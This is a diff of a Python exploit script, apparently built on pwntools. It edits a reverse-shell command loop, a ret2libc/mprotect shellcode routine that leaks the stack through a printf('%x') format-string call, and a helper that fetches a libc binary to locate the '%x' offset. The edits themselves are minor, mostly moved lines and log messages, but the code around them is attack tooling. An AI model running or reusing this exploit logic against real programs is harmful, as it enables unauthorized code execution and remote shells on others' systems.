@@ -43,8 +43,8 @@ def handleReverseShell():
         commandModifier = b" 2>&1"
     while noEOF:
         command = input("$ ")
-        proc.sendline((command).encode('utf-8')+commandModifier)
         try:
+            proc.sendline((command).encode('utf-8')+commandModifier)
             print(proc.recv(timeout = 0.2).decode('utf-8'))
         except EOFError:
             return 200
@@ -187,8 +187,7 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
                              # Which is libc's '%x' offset making the function call printf('%x') 
                              # Which is a format string vulnerability leaking the next value on the stack in hex
         )
-        log.info("Leaking stack via printf(%%x)")
-
+        log.info("Leaking stack via printf(%x)")
         # Execute 'leakNo' number of stack leaks and find stack values
         stackVal = False
         try:
@@ -346,7 +345,9 @@ def getPercXOff(libcJson):
     response = requests.get(libcUrl, headers=headers2)
     filebytes = response.content
     # Find and return the offset in the binary of '%x'
-    return filebytes.find(b"%x\x00")
+    offset = filebytes.find(b"%x\x00")
+    log.success("Found %x in libc: "+hex(offset))
+    return offset
 
 # String to boolean converter is a modified version of: https://stackoverflow.com/a/43357954 (Maxim & dennlinger, 2021)
 def str2bool(v, argname):
